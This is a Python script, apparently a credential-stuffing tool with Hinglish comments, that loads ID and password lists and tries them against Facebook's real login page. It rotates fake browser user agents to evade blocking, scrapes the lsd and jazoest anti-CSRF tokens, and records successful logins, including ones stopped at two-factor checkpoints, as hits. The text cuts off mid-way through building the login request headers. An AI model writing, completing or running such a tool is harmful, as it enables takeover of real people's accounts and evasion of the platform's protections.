import os
import re
import time
import json
import uuid
import random
import requests
import sys
from bs4 import BeautifulSoup
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

# ============================================================
# USER FILES (same directory mein rakhein)
# ============================================================
ID_FILE = "ids.txt"           # 1 ID per line
PASS_FILE = "passwords.txt"   # 1 password per line
RESULT_FILE = "RESULTS.txt"   # Yahan hits save honge
# ============================================================

os.system('clear' if 'win' in sys.platform else 'clear')

# Colors
R = '\033[1;31m'
G = '\033[1;32m'
Y = '\033[1;33m'
C = '\033[1;36m'
B = '\033[1;34m'
W = '\033[1;37m'
M = '\033[1;35m'
RESET = '\033[0m'

hits = []
attempted = 0
total_attempts = 0
start_time = datetime.now()

# ============================================================
# USER AGENTS
# ============================================================
def random_ua():
    """Realistic browser user agents"""
    uas = [
        f"Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 11; Pixel 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/537.36",
        f"Mozilla/5.0 (Linux; Android 12; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile Safari/537.36",
        f"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/537.36",
        f"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Safari/537.36",
        f"Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/{random.randint(100,120)}.0.{random.randint(4000,6500)}.{random.randint(80,200)} Mobile/15E148 Safari/604.1",
    ]
    return random.choice(uas)

# ============================================================
# LOAD FILES
# ============================================================
def load_file(filepath, label):
    if not os.path.exists(filepath):
        print(f"{R}[!] ERROR: '{filepath}' nahi mili!{RESET}")
        print(f"{Y}Is file ko script wali directory mein rakhein.{RESET}")
        sys.exit(1)
    with open(filepath, 'r', errors='ignore') as f:
        items = [line.strip() for line in f if line.strip()]
    items = list(dict.fromkeys(items))  # Remove duplicates
    print(f"{G}[✓] {label}: {len(items)} items loaded from '{filepath}'{RESET}")
    return items

# ============================================================
# REAL FACEBOOK LOGIN CHECK
# ============================================================
def check_login_real(email, password):
    """
    Real Facebook login check using www.facebook.com/login/
    
    Returns:
        "HIT"    -> Login successful
        "2FA"    -> Login successful but 2FA checkpoint
        "WRONG"  -> Wrong password
        "BLOCK"  -> Rate limited / blocked
        "ERROR"  -> Unexpected error
    """
    session = requests.Session()
    
    # Step 1: Get login page to extract hidden tokens
    headers1 = {
        'User-Agent': random_ua(),
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'DNT': '1',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
        'Sec-Fetch-Dest': 'document',
        'Sec-Fetch-Mode': 'navigate',
        'Sec-Fetch-Site': 'none',
        'Sec-Fetch-User': '?1',
    }
    
    try:
        r = session.get('https://www.facebook.com/', headers=headers1, timeout=15)
    except Exception as e:
        return "ERROR", str(e)
    
    # Extract hidden form fields from login page
    soup = BeautifulSoup(r.text, 'html.parser')
    
    # Facebook uses 'lsd' (LSD - Login Session Data) token
    lsd = ''
    lsd_input = soup.find('input', {'name': 'lsd'})
    if lsd_input:
        lsd = lsd_input.get('value', '')
    
    # jazoest is another anti-CSRF field
    jazoest = ''
    jazoest_input = soup.find('input', {'name': 'jazoest'})
    if jazoest_input:
        jazoest = jazoest_input.get('value', '')
    
    # Extract the action URL for the login form
    login_form = soup.find('form', {'id': 'login_form'})
    if not login_form:
        login_form = soup.find('form', {'method': 'post'})
    
    action_url = 'https://www.facebook.com/login/'
    if login_form and login_form.get('action'):
        action = login_form.get('action')
        if action.startswith('/'):
            action_url = 'https://www.facebook.com' + action
        else:
            action_url = action
    
    # Step 2: Submit login
    headers2 = {
        'User-Agent': random_ua(),
        '